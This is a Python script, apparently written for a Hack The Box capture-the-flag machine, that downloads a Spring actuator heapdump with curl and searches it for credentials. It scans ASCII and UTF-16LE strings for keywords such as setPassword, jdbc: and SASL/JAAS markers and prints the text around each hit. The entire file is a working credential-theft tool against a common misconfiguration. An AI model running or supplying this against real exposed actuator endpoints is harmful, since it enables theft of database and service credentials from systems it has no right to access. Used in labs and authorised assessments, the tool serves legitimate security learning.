#!/usr/bin/env python3
"""Extract credential-adjacent strings from a Spring actuator heapdump.

Java heaps store many secrets as plain Strings next to Hikari setters
(setUsername / setPassword / setJdbcUrl). This helper prints a sliding
window of ASCII and UTF-16LE strings around those markers.

Usage:
  python3 heap_extract.py loot/heap.bin
  curl -s -o heap.bin http://api.htb-airport.htb/actuator/heapdump
  python3 heap_extract.py heap.bin --window 12
  python3 heap_extract.py heap.bin --utf16
"""
from __future__ import annotations

import argparse
import re
import sys

KEYWORDS = (
    "setusername",
    "setpassword",
    "setjdbcurl",
    "setpoolname",
    "hikari",
    "svc_event",
    "clickhouse",
    "jdbc:",
    "plainloginmodule",
    "user_svc",
    "jaas",
    "sasl",
    "partner_feed",
    "clickhousejdbcdockercompose",
)


def ascii_strings(data: bytes, min_len: int) -> list[str]:
    pat = re.compile(rb"[\x20-\x7e]{%d,}" % min_len)
    return [m.group().decode("ascii") for m in pat.finditer(data)]


def utf16le_strings(data: bytes, min_len: int) -> list[str]:
    out: list[str] = []
    n = len(data)
    i = 0
    while i + 2 <= n:
        chars: list[str] = []
        j = i
        while j + 2 <= n and data[j + 1] == 0 and 32 <= data[j] < 127:
            chars.append(chr(data[j]))
            j += 2
        if len(chars) >= min_len:
            out.append("".join(chars))
            i = j
        else:
            i += 1
    return out


def dump_hits(label: str, strings: list[str], window: int) -> int:
    hits = 0
    lower = [s.lower() for s in strings]
    seen: set[int] = set()
    for i, s in enumerate(lower):
        if not any(k in s for k in KEYWORDS):
            continue
        lo = max(0, i - window)
        if lo in seen:
            continue
        seen.add(lo)
        hits += 1
        hi = min(len(strings), i + window + 1)
        print(f"\n=== {label} hit @{i} ({strings[i][:80]!r}) ===")
        for j in range(lo, hi):
            mark = ">>" if j == i else "  "
            print(f"{mark} [{j}] {strings[j][:200]}")
    return hits


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("heap", help="path to actuator heapdump")
    ap.add_argument("--min-len", type=int, default=6)
    ap.add_argument("--window", type=int, default=10, help="strings either side of a keyword")
    ap.add_argument("--utf16", action="store_true", help="also scan UTF-16LE (slow on 50MB+ dumps)")
    args = ap.parse_args()

    data = open(args.heap, "rb").read()
    print(f"[*] {args.heap}: {len(data)} bytes", file=sys.stderr)

    ascii = ascii_strings(data, args.min_len)
    print(f"[*] ASCII strings ≥{args.min_len}: {len(ascii)}", file=sys.stderr)
    n = dump_hits("ASCII", ascii, args.window)

    if args.utf16:
        u16 = utf16le_strings(data, args.min_len)
        print(f"[*] UTF-16LE strings ≥{args.min_len}: {len(u16)}", file=sys.stderr)
        n += dump_hits("UTF-16LE", u16, args.window)

    if n == 0:
        print("[-] no keyword hits — try strings -a heap.bin | grep -E 'setUsername|jdbc:'", file=sys.stderr)
        return 1
    print(f"\n[*] {n} neighbourhood(s)", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
